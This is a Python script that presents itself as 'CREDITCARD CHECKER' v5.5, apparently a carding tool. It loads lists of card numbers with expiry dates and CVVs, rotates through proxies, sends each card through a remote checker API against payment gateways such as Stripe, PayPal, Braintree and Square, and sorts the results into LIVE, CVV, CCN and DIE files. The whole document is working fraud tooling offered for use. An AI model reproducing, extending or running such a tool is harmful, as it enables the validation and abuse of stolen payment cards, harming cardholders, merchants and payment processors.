import os
import sys
import time
import json
import requests
import threading
import configparser
from colorama import *
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor, as_completed

#colors
merah = Fore.LIGHTRED_EX
hijau = Fore.LIGHTGREEN_EX
biru = Fore.LIGHTBLUE_EX
kuning = Fore.LIGHTYELLOW_EX
magenta = Fore.LIGHTMAGENTA_EX
cyan = Fore.CYAN
reset = Fore.RESET
bl = Fore.BLUE
wh = Fore.WHITE
gr = Fore.LIGHTGREEN_EX
red = Fore.LIGHTRED_EX
res = Style.RESET_ALL
yl = Fore.YELLOW
cy = Fore.CYAN
mg = Fore.MAGENTA
bc = Back.GREEN
fr = Fore.RED
sr = Style.RESET_ALL
fb = Fore.BLUE
fc = Fore.LIGHTCYAN_EX
fg = Fore.GREEN
br = Back.RED

# BANNER 

banner = f"""{hijau}
                                 /           /                          
                                /' .,,,,  ./ \                           
                               /';'     ,/  \                                
                              / /   ,,//,'''                         
                             ( ,, '_,  ,,,' ''                 
                             |    /{merah}@{hijau}  ,,, ;' '               
                            /    .   ,''/' ',''       
                           /   .     ./, ',, ' ;                      
                        ,./  .   ,-,',' ,,/''\,'                 
                       |   /; ./,,'',,'' |   |                                               
                       |     /   ','    /    |                                               
                        \___/'   '     |     |                                               
                         ',,'  |      /     '\                                              
                              /  (   |   )    ~\                                            
                             '   \   (    \     \~                                            
                             :    \                \                                                 
                              ; .         \--                                                  
                               :   \         ; {magenta}                                                 
,------.    ,---.  ,------. ,--. ,--.,--.   ,--. ,-----.  ,-----. ,------.  ,------. 
|  .-.  \  /  O  \ |  .--. '|  .'   / \  `.'  / '  .--./ '  .-.  '|  .-.  \ |  .---' 
|  |  \  :|  .-.  ||  '--'.'|  .   '   .'    \  |  |     |  | |  ||  |  \  :|  `--,  
|  '--'  /|  | |  ||  |\  \ |  |\   \ /  .'.  \ '  '--'\ '  '-'  '|  '--'  /|  `---. 
`-------' `--' `--'`--' '--'`--' '--''--'   '--' `-----'  `-----' `-------' `------' {reset}
{fr}       ==================================================================={reset}
                    |{fb} SCRIPT{reset}  :{fg} CREDITCARD CHECKER{reset}           |
                    |{fb} VERSION{reset} :{fg} 5.5{reset}                          |
                    |{fb} AUTHOR {reset} :{fg} https://t.me/zlaxtert{reset}        |
{fr}       ==================================================================={reset}
"""

class CreditCardChecker:
    def __init__(self):
        self.config = configparser.ConfigParser()
        self.settings_file = 'settings.ini'
        self.cc_file = None
        self.proxy_file = None
        self.gateway = None
        self.api = None
        self.apikey = None
        self.proxy_auth = None
        self.type_proxy = None
        self.proxies = []
        self.cc_list = []
        self.results = []
        self.live_count = 0
        self.ccn_count = 0
        self.cvv_count = 0
        self.die_count = 0
        self.checked_count = 0
        self.lock = threading.Lock()
        
        # Create result directory if not exists
        if not os.path.exists('result'):
            os.makedirs('result')
    
    def load_settings(self):
        if not os.path.exists(self.settings_file):
            self.create_default_settings()
        
        self.config.read(self.settings_file)
        self.api = self.config.get('API', 'endpoint', fallback='')
        self.apikey = self.config.get('API', 'apikey', fallback='')
        self.proxy_auth = self.config.get('PROXY', 'auth', fallback='')
        self.type_proxy = self.config.get('PROXY', 'type', fallback='http')
    
    def create_default_settings(self):
        self.config['API'] = {
            'endpoint': 'your-api-server.com',
            'apikey': 'your_api_key_here'
        }
        self.config['PROXY'] = {
            'auth': 'username:password',
            'type': 'http'
        }
        self.config['TELEGRAM'] = {
            'token': 'your_telegram_bot_token_here'
        }

        with open(self.settings_file, 'w') as configfile:
            self.config.write(configfile)

        print(f"{res}[{yl}!{res}]{fb} Created default {self.settings_file}. Please configure it before running the checker {res}[{yl}!{res}]{fb}")
        sys.exit(0)
    
    def load_cc_file(self, filename):
        if not os.path.exists(filename):
            print(f" {res}[{yl}!{res}]{fb} Error: File {filename} not found {res}[{yl}!{res}]{fb}")
            return False
        
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                
                # Support both | and : separators
                if '|' in line:
                    parts = line.split('|')
                elif ':' in line:
                    parts = line.split(':')
                else:
                    print(f"{res}[{yl}!{res}]{fb} Invalid format in line: {line} {res}[{yl}!{res}]{fb}")
                    continue
                
                if len(parts) >= 4:
                    cc = parts[0].strip()
                    month = parts[1].strip()
                    year = parts[2].strip()
                    cvv = parts[3].strip()
                    
                    # Format year if needed (convert 2-digit to 4-digit)
                    if len(year) == 2:
                        year = '20' + year
                    
                    self.cc_list.append(f"{cc}|{month}|{year}|{cvv}")
        
        return len(self.cc_list) > 0
    
    def load_proxy_file(self, filename):
        if not os.path.exists(filename):
            print(f"{res}[{yl}!{res}]{fb} Error: File {filename} not found {res}[{yl}!{res}]{fb}")
            return False
        
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and ':' in line:
                    self.proxies.append(line)
        
        return len(self.proxies) > 0
    
    def choose_gateway(self):
        print(f"\n   {fr}==============>{fg} GATEWAY {fr}<================")
        print(f"  {res}[{fg}1{res}]{fb} VBV CHECK     {res}[{fg}2{res}]{fb} STRIPE")
        print(f"  {res}[{fg}3{res}]{fb} PAYPAL        {res}[{fg}4{res}]{fb} BRAINTREE")
        print(f"  {res}[{fg}5{res}]{fb} SQUARE        {res}[{fg}6{res}]{fb} STRIPE CHARGER")
        print(f"          {res}[{fg}99{res}]{fr}EXIT{res}")
        
        while True:
            try:
                choice = int(input(f"\n{res}[{fg}+{res}]{fb} Select gateway{fg} >> {fb}").strip())
                if choice == 1:
                    self.gateway = "vbv"
                    break
                elif choice == 2:
                    self.gateway = "stripe"
                    break
                elif choice == 3:
                    self.gateway = "paypal"
                    break
                elif choice == 4:
                    self.gateway = "braintree"
                    break
                elif choice == 5:
                    self.gateway = "square"
                    break
                elif choice == 6:
                    self.gateway = "stripe_charger"
                    break
                elif choice == 99:
                    print(f"\n\n{res}[{yl}!{res}]{fb}. . . Exiting . . .{res}[{yl}!{res}]{fb}\n\n")
                    sys.exit(0)
                else:
                    print(f"{res}[{yl}!{res}]{fb} Invalid choice. Please try again {res}[{yl}!{res}]")
            except ValueError:
                print(f"{res}[{yl}!{res}]{fb} Please enter a valid number {res}[{yl}!{res}]{fb}.")
    
    def get_threads_count(self):
        while True:
            try:
                threads = int(input(f"{res}[{fg}+{res}]{fb} Enter number of Threads (3-10){fg} >> {fb}").strip())
                if 3 <= threads <= 10:
                    return threads
                else:
                    print(f"{res}[{yl}!{res}]{fb} Threads must be between 3 and 10 {res}[{yl}!{res}]{fb}")
            except ValueError:
                print(f"{res}[{yl}!{res}]{fb} Please enter a valid number {res}[{yl}!{res}]{fb}")
    
    def check_cc(self, cc_data, proxy):
        url = f"https://{self.api}/checker/CC-CHECKERV5.5/?list={cc_data}&apikey={self.apikey}&proxy={proxy}&proxyAuth={self.proxy_auth}&type_proxy={self.type_proxy}&gate={self.gateway}"
        
        try:
            response = requests.get(url, timeout=30)
            if response.status_code == 200:
                data = response.json()
                
                if 'data' in data and 'info' in data['data']:
                    info = data['data']['info']
                    
                    result = {
                        'cc': cc_data,
                        'valid': info.get('valid', False),
                        'bin': info.get('bin', ''),
                        'scheme': info.get('scheme', ''),
                        'type': info.get('type', ''),
                        'bank_name': info.get('bank_name', ''),
                        'country': info.get('country', ''),
                        'msg': info.get('msg', ''),
                        'gateway': info.get('gateway', ''),
                        'response': data
                    }
                    
                    return result
                else:
                    return {'cc': cc_data, 'error': 'Invalid response format', 'response': data}
            else:
                return {'cc': cc_data, 'error': f'HTTP Error: {response.status_code}'}
        except Exception as e:
            return {'cc': cc_data, 'error': f'Request failed: {str(e)}'}
    
    def process_result(self, result):
        with self.lock:
            self.checked_count += 1
            self.results.append(result)
            
            # Display progress
            progress = f"{res}[{fr}{self.checked_count}{res}/{fg}{len(self.cc_list)}{res}]"
            
            if 'error' in result:
                status = f"ERROR: {result['error']}"
                print(f"{progress} {biru} {result['cc']} {yl}->{res} {status}{cyan} BY DARKXCODE V5.5{reset}")
                return
            
            msg = result['msg'].lower()
            cc_data = result['cc']
            
            # Check for LIVE responses
            live_keywords = [
                "approved", "success", "approv", "thank you", "cvc_check", 
                "one-time", "succeeded", "authenticate successful", 
                "authenticate attempt successful",  'authenticate unavailable', 'authenticate unable to authenticate'
            ]
            
            # Check for CVV responses
            cvv_keywords = [
                "transaction_not_allowed", "authentication_required",
                "your card zip code is incorrect", "card_error_authentication_required",
                "three_d_secure_redirect", "invalid_billing_address",
                "address_verification_failure"
            ]
            
            # Check for CCN responses
            ccn_keywords = [
                "incorrect_cvc", "invalid_cvc", "insufficient_funds",
                "invalid_security_code", "cvv_failure"
            ]
            
            # Check for DIE responses
            die_keywords = ["failed"]
            
            is_live = any(keyword in msg for keyword in live_keywords)
            is_cvv = any(keyword in msg for keyword in cvv_keywords)
            is_ccn = any(keyword in msg for keyword in ccn_keywords)
            is_die = any(keyword in msg for keyword in die_keywords) or not result['valid']
            
            if is_live:
                self.live_count += 1
                status = "LIVE"
                self.save_result('LIVE.txt', status +" | " + cc_data, msg)
            elif is_cvv:
                self.cvv_count += 1
                status = "CVV"
                self.save_result('CVV.txt', status +" | " + cc_data, msg)
            elif is_ccn:
                self.ccn_count += 1
                status = "CCN"
                self.save_result('CCN.txt', status +" | " + cc_data, msg)
            elif is_die:
                self.die_count += 1
                status = "DIE"
                self.save_result('DIE.txt', status +" | " + cc_data, msg)
            else:
                status = "UNKNOWN"
                self.save_result('UNKNOWN.txt', status +" | " + cc_data, result)
                
            if status == "LIVE":
                stats = f"{hijau}{status}{reset}"
            elif status == "CVV":
                stats = f"{biru}{status}{reset}"
            elif status == "CCN":
                stats = f"{kuning}{status}{reset}"
            elif status == "DIE":
                stats = f"{merah}{status}{reset}"
            else:
                stats = f"{magenta}{status}{reset}"
                
            print(f"{progress} {biru} {cc_data} {yl}-> {res}{stats}:{yl} {msg}{reset}{cyan} BY DARKXCODE V5.5{reset}")
    
    def save_result(self, filename, cc_data, result):
        filepath = os.path.join('result', filename)
        with open(filepath, 'a', encoding='utf-8') as f:
            f.write(f"{cc_data} | {json.dumps(result)}\n")
    
    def run_checker(self):
        # print("Loading settings...")
        self.load_settings()
        
        # Get CC file
        self.cc_file = input(f"{res}[{yl}+{res}]{fb} Enter CC file path{fg} >> {fb}").strip()
        if not self.load_cc_file(self.cc_file):
            print(f"{res}[{yl}!{res}]{fb} No valid CC records found {res}[{yl}!{res}]{fb}")
            return
        
        # Get proxy file
        self.proxy_file = input(f"{res}[{yl}+{res}]{fb} Enter proxy file path{fg} >> {fb}").strip()
        if not self.load_proxy_file(self.proxy_file):
            print(f"{res}[{yl}!{res}]{fb} No valid proxies found {res}[{yl}!{res}]{fb}")
            return
        
        # Choose gateway
        self.choose_gateway()
        
        # Get threads count
        threads_count = self.get_threads_count()
        print(f"{yl}={res}" * 75)
        
        start_time = time.time()
        
        # Rotating proxy index
        proxy_index = 0
        
        with ThreadPoolExecutor(max_workers=threads_count) as executor:
            futures = []
            
            for cc in self.cc_list:
                # Get next proxy (rotate through available proxies)
                proxy = self.proxies[proxy_index]
                proxy_index = (proxy_index + 1) % len(self.proxies)
                
                # Submit task
                future = executor.submit(self.check_cc, cc, proxy)
                futures.append(future)
            
            # Process results as they complete
            for future in as_completed(futures):
                result = future.result()
                self.process_result(result)
        
        end_time = time.time()
        elapsed_time = end_time - start_time
        
        print(f"{yl}={res}" * 75)
        print("Checking completed!")
        print(f"Total: {len(self.cc_list)}")
        print(f"LIVE: {self.live_count}")
        print(f"CVV: {self.cvv_count}")
        print(f"CCN: {self.ccn_count}")
        print(f"DIE: {self.die_count}")
        print(f"Time taken: {elapsed_time:.2f} seconds")

def main():
    print(banner)
    checker = CreditCardChecker()
    checker.run_checker()

if __name__ == "__main__":

    main()
